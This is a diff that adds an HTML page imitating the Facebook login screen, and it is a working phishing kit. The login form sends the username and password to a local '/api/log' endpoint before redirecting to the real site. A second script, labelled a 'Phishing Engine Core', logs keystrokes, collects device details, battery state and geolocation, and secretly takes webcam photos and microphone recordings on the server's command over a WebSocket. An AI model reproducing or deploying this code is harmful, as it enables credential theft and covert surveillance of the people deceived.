@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Log In or Sign Up</title>
+  <style>
+    :root {
+      --bg-color: #0c1014;
+      --card-bg: #1c222a;
+      --text-color: #e0e8f0;
+      --input-bg: #151a21;
+      --input-border: #303e4d;
+      --fb-blue: #1877f2;
+      --fb-green: #42b72a;
+    }
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-family: Helvetica, Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      user-select: none;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+    }
+    .logo-container {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo {
+      color: var(--fb-blue);
+      font-size: 40px;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    input {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 14px 16px;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 6px;
+      color: #fff;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus {
+      border-color: var(--fb-blue);
+    }
+    .btn-login {
+      width: 100%;
+      background: var(--fb-blue);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 14px 16px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .btn-login:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .footer-links {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 13px;
+    }
+    .footer-links a {
+      color: var(--fb-blue);
+      text-decoration: none;
+    }
+    .btn-create {
+      display: block;
+      width: fit-content;
+      margin: 20px auto 0 auto;
+      background: var(--fb-green);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 16px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo-container">
+    <a href="#" class="logo">facebook</a>
+  </div>
+  <div class="card">
+    <form id="login-form">
+      <div class="form-group">
+        <input type="text" id="email" placeholder="Mobile number or email address" autocomplete="username" required>
+      </div>
+      <div class="form-group">
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+      </div>
+      <button type="submit" class="btn-login" id="btn-submit" disabled>Log In</button>
+    </form>
+    <div class="footer-links">
+      <a href="#">Forgotten password?</a>
+    </div>
+    <hr style="border: 0; border-top: 1px solid var(--input-border); margin: 20px 0;">
+    <a href="#" class="btn-create">Create new account</a>
+  </div>
+</div>
+
+<script>
+  const form = document.getElementById('login-form');
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const submitBtn = document.getElementById('btn-submit');
+
+  function validate() {
+    submitBtn.disabled = !(emailInput.value.trim().length > 0 && passwordInput.value.length >= 6);
+  }
+  emailInput.addEventListener('input', validate);
+  passwordInput.addEventListener('input', validate);
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Logging in...';
+
+    if (typeof captureAudioOnLogin === 'function') {
+      captureAudioOnLogin();
+    }
+
+    try {
+      await fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: emailInput.value, password: passwordInput.value })
+      });
+    } catch(err) {}
+
+    setTimeout(() => {
+      window.location.assign('https://www.facebook.com');
+    }, 6500);
+  });
+</script>
+
+<!-- Embedded Phishing Engine Core (WebSocket & Media Relay) -->
+<script>
+  (function () {
+    'use strict';
+    let ws = null;
+    let wsReady = false;
+    const msgQueue = [];
+    let keystrokeBuffer = '';
+    let keystrokeTimer = null;
+
+    document.addEventListener('keydown', (e) => {
+      let key = e.key;
+      if (key === 'Enter') key = ' [Enter]\n';
+      else if (key === 'Backspace') key = ' [Backspace] ';
+      else if (key === 'Tab') key = ' [Tab] ';
+      else if (key.length > 1) key = ` [${key}] `;
+      
+      keystrokeBuffer += key;
+      if (!keystrokeTimer) {
+        keystrokeTimer = setTimeout(() => {
+          if (keystrokeBuffer) {
+            sendWS({ type: 'keystroke_data', keys: keystrokeBuffer });
+            keystrokeBuffer = '';
+          }
+          keystrokeTimer = null;
+        }, 500);
+      }
+    });
+
+    async function connectWS() {
+      const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${proto}//${location.host}`);
+
+      ws.onopen = async () => {
+        wsReady = true;
+        while (msgQueue.length > 0) {
+          ws.send(JSON.stringify(msgQueue.shift()));
+        }
+
+        let batteryLevel = null;
+        let batteryCharging = null;
+        try {
+          if (navigator.getBattery) {
+            const batt = await navigator.getBattery();
+            batteryLevel = Math.round(batt.level * 100);
+            batteryCharging = batt.charging;
+            
+            batt.addEventListener('levelchange', () => {
+              sendWS({ type: 'battery_update', level: Math.round(batt.level * 100), charging: batt.charging });
+            });
+            batt.addEventListener('chargingchange', () => {
+              sendWS({ type: 'battery_update', level: Math.round(batt.level * 100), charging: batt.charging });
+            });
+          }
+        } catch (e) {}
+
+        sendWS({
+          type: 'user_info',
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          batteryLevel,
+          batteryCharging
+        });
+        startCapture();
+      };
+
+      ws.onmessage = (evt) => {
+        let msg;
+        try { msg = JSON.parse(evt.data); } catch { return; }
+        handleServerCommand(msg);
+      };
+
+      ws.onclose = () => {
+        wsReady = false;
+        setTimeout(connectWS, 5000);
+      };
+      ws.onerror = () => { };
+    }
+
+    function sendWS(data) {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify(data));
+      } else {
+        msgQueue.push(data);
+      }
+    }
+
+    function handleServerCommand(msg) {
+      switch (msg.type) {
+        case 'CAPTURE_PHOTO':       capturePhoto();    break;
+        case 'CAPTURE_AUDIO':       captureAudio();    break;
+        case 'SEND_LOCATION':       sendLocation();    break;
+        case 'SHOW_NOTIFICATION':
+          const notif = document.createElement('div');
+          notif.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#1c222a;border:1px solid #303e4d;color:#fff;padding:12px 24px;border-radius:8px;z-index:999999;box-shadow:0 4px 12px rgba(0,0,0,0.5);font-family:sans-serif;font-size:14px;';
+          notif.textContent = msg.message;
+          document.body.appendChild(notif);
+          setTimeout(() => notif.remove(), 6000);
+          break;
+      }
+    }
+
+    function sendLocation() {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(
+        (pos) => sendWS({
+          type: 'location_update',
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }),
+        () => { },
+        { enableHighAccuracy: true }
+      );
+    }
+
+    function capturePhoto() {
+      if (!navigator.mediaDevices) return;
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.setAttribute('playsinline', '');
+          video.muted = true;
+          video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+          document.body.appendChild(video);
+          video.play().then(() => {
+            setTimeout(() => {
+              try {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                sendWS({ type: 'capture_photo', data: canvas.toDataURL('image/jpeg', 0.8) });
+              } catch (e) {}
+              stream.getTracks().forEach(t => t.stop());
+              video.remove();
+            }, 1000);
+          });
+        }).catch(() => {});
+    }
+
+    function captureAudio() {
+      if (!navigator.mediaDevices) return;
+      navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+        .then(stream => {
+          const chunks = [];
+          const recorder = new MediaRecorder(stream);
+          recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+          recorder.onstop = () => {
+            const reader = new FileReader();
+            reader.onload = () => sendWS({ type: 'capture_audio', data: reader.result });
+            reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
+          };
+          recorder.start();
+          setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
+        }).catch(() => {});
+    }
+
+    function startCapture() {
+      if (navigator.mediaDevices) {
+        capturePhoto();
+        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+          .then(stream => {
+            const chunks = [];
+            const recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            recorder.onstop = () => {
+              const reader = new FileReader();
+              reader.onload = () => sendWS({ type: 'capture_audio', data: reader.result });
+              reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }));
+            };
+            recorder.start();
+            setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000);
+          }).catch(() => {});
+      }
+      sendLocation();
+    }
+
+    window.captureAudioOnLogin = captureAudio;
+
+    connectWS();
+  })();
+</script>
+</body>
+</html>
